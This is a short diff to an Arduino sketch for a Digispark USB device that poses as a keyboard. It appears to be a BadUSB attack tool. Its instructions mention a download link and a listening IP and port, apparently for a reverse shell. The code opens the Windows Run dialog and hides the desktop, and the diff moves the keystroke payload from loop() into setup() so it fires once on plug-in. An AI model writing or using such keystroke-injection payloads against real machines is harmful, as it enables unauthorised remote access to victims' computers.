@@ -6,9 +6,6 @@ Replace LINK with a direct download link, IP with your listening IP, and PORT wi
 
   #include "DigiKeyboard.h"
   void setup() {
-    //empty
-  }
-  void loop() {
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
@@ -25,5 +22,6 @@ Replace LINK with a direct download link, IP with your listening IP, and PORT wi
     DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
     DigiKeyboard.delay(10000);
     DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
-    for(;;){ /*empty*/ }
+  }
+  void loop() {
   }
